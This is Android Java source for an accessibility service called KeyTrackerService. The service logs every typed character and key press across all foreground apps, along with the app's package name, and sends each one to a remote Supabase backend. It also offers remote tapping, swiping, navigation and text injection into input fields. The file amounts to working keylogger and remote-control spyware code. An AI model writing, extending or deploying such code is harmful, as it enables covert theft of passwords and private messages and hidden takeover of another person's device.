package com.andtracker;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;
import android.view.KeyEvent;
import android.graphics.Path;
import java.util.List;

public class KeyTrackerService extends AccessibilityService {
    private static final String TAG = "KeyTrackerService";
    private static volatile KeyTrackerService INSTANCE;

    private Handler mainHandler;
    private volatile String lastPackageName = null;

    public static KeyTrackerService getInstance() {
        return INSTANCE;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        if (event.getPackageName() != null) {
            lastPackageName = event.getPackageName().toString();
        }

        // Capturer les événements de changement de texte
        // IMPORTANT: ne pas traiter TYPE_VIEW_TEXT_SELECTION_CHANGED ici, sinon on duplique souvent
        // (beaucoup d’IME déclenchent selection_changed juste après chaque caractère)
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            CharSequence beforeText = event.getBeforeText();
            // event.getText() returns a List<CharSequence>
            List<CharSequence> texts = event.getText();
            CharSequence text = null;
            if (texts != null && !texts.isEmpty()) {
                // In practice, the first item is the current text of the view.
                text = texts.get(0);
            }

            if (Log.isLoggable(TAG, Log.DEBUG)) {
                Log.d(TAG, "A11y event type=" + event.getEventType()
                        + " pkg=" + event.getPackageName()
                        + " cls=" + event.getClassName()
                        + " before=" + (beforeText == null ? "null" : "\"" + beforeText + "\"")
                        + " text=" + (text == null ? "null" : "\"" + text + "\""));
            }
            
            if (text != null && text.length() > 0) {
                // Preferred: use event indices/counts (more reliable than beforeText diffs)
                int fromIndex = event.getFromIndex();
                int addedCount = event.getAddedCount();

                if (fromIndex >= 0 && addedCount > 0 && fromIndex + addedCount <= text.length()) {
                    String added = text.subSequence(fromIndex, fromIndex + addedCount).toString();
                    for (int i = 0; i < added.length(); i++) {
                        sendKeyToSupabase(String.valueOf(added.charAt(i)), "text_changed", null, lastPackageName, null);
                    }
                    return;
                }

                // Fallback: naive diff using beforeText
                if (beforeText != null && beforeText.length() > 0) {
                    int beforeLength = beforeText.length();
                    int currentLength = text.length();
                    if (currentLength > beforeLength) {
                        String newChars = text.subSequence(beforeLength, currentLength).toString();
                        for (int i = 0; i < newChars.length(); i++) {
                            sendKeyToSupabase(String.valueOf(newChars.charAt(i)), "text_changed", null, lastPackageName, null);
                        }
                    }
                } else if (text.length() > 0) {
                    // Last resort: send last character
                    sendKeyToSupabase(String.valueOf(text.charAt(text.length() - 1)), "text_changed", null, lastPackageName, null);
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        if (event == null) return super.onKeyEvent(null);

        if (event.getAction() == KeyEvent.ACTION_DOWN) {
            int unicode = event.getUnicodeChar();
            if (unicode != 0) {
                String key = String.valueOf((char) unicode);
                Log.d(TAG, "KeyEvent unicode=" + unicode + " key=\"" + key + "\"");
                sendKeyToSupabase(key, "key_event", "down", lastPackageName, event.getKeyCode());
            } else {
                // Handle common non-unicode keys
                int code = event.getKeyCode();
                if (code == KeyEvent.KEYCODE_ENTER) {
                    Log.d(TAG, "KeyEvent ENTER");
                    sendKeyToSupabase("\n", "key_event", "down", lastPackageName, code);
                } else if (code == KeyEvent.KEYCODE_DEL) {
                    Log.d(TAG, "KeyEvent BACKSPACE");
                    sendKeyToSupabase("[BACKSPACE]", "key_event", "down", lastPackageName, code);
                } else if (code == KeyEvent.KEYCODE_SPACE) {
                    Log.d(TAG, "KeyEvent SPACE");
                    sendKeyToSupabase(" ", "key_event", "down", lastPackageName, code);
                }
            }
        }

        return super.onKeyEvent(event);
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        INSTANCE = this;
        mainHandler = new Handler(Looper.getMainLooper());
        Log.d(TAG, "Accessibility service connected. Supabase URL configured=" +
                (BuildConfig.SUPABASE_URL != null && !BuildConfig.SUPABASE_URL.isEmpty()));
    }

    @Override
    public void onDestroy() {
        if (INSTANCE == this) {
            INSTANCE = null;
        }
        super.onDestroy();
    }

    public void performTap(double xNorm, double yNorm) {
        runOnMain(() -> {
            DisplayMetrics dm = getResources().getDisplayMetrics();
            int x = (int) Math.max(0, Math.min(dm.widthPixels - 1, xNorm * dm.widthPixels));
            int y = (int) Math.max(0, Math.min(dm.heightPixels - 1, yNorm * dm.heightPixels));

            Path path = new Path();
            path.moveTo(x, y);
            GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, 60);
            GestureDescription gesture = new GestureDescription.Builder().addStroke(stroke).build();
            dispatchGesture(gesture, null, null);
        });
    }

    public void performSwipe(double x1Norm, double y1Norm, double x2Norm, double y2Norm, long durationMs) {
        runOnMain(() -> {
            DisplayMetrics dm = getResources().getDisplayMetrics();
            int x1 = (int) Math.max(0, Math.min(dm.widthPixels - 1, x1Norm * dm.widthPixels));
            int y1 = (int) Math.max(0, Math.min(dm.heightPixels - 1, y1Norm * dm.heightPixels));
            int x2 = (int) Math.max(0, Math.min(dm.widthPixels - 1, x2Norm * dm.widthPixels));
            int y2 = (int) Math.max(0, Math.min(dm.heightPixels - 1, y2Norm * dm.heightPixels));

            long dur = Math.max(50, Math.min(5000, durationMs));
            Path path = new Path();
            path.moveTo(x1, y1);
            path.lineTo(x2, y2);
            GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, dur);
            GestureDescription gesture = new GestureDescription.Builder().addStroke(stroke).build();
            dispatchGesture(gesture, null, null);
        });
    }

    public void performGlobal(String action) {
        runOnMain(() -> {
            if (action == null) return;
            switch (action) {
                case "back":
                    performGlobalAction(GLOBAL_ACTION_BACK);
                    break;
                case "home":
                    performGlobalAction(GLOBAL_ACTION_HOME);
                    break;
                case "recents":
                    performGlobalAction(GLOBAL_ACTION_RECENTS);
                    break;
            }
        });
    }

    public void performSetText(String text) {
        runOnMain(() -> {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;

            AccessibilityNodeInfo focus = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
            AccessibilityNodeInfo target = focus != null ? focus : findFirstEditable(root);
            if (target == null) return;

            boolean ok = false;
            try {
                Bundle args = new Bundle();
                args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                ok = target.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
            } catch (Throwable ignored) {}

            if (!ok) {
                // Fallback: clipboard + paste
                try {
                    ClipboardManager cm = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                    if (cm != null) {
                        cm.setPrimaryClip(ClipData.newPlainText("remote", text));
                        target.performAction(AccessibilityNodeInfo.ACTION_PASTE);
                    }
                } catch (Throwable ignored) {}
            }
        });
    }

    private void runOnMain(Runnable r) {
        Handler h = mainHandler;
        if (h != null) {
            h.post(r);
        } else {
            r.run();
        }
    }

    private AccessibilityNodeInfo findFirstEditable(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.isEditable()) return node;
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            AccessibilityNodeInfo res = findFirstEditable(child);
            if (res != null) return res;
        }
        return null;
    }

    private void sendKeyToSupabase(String key, String source, String action, String packageName, Integer keyCode) {
        SupabaseAndroidEventsClient.sendEvent(
                this,
                packageName,
                source,
                action,
                key,
                keyCode
        );
    }
}
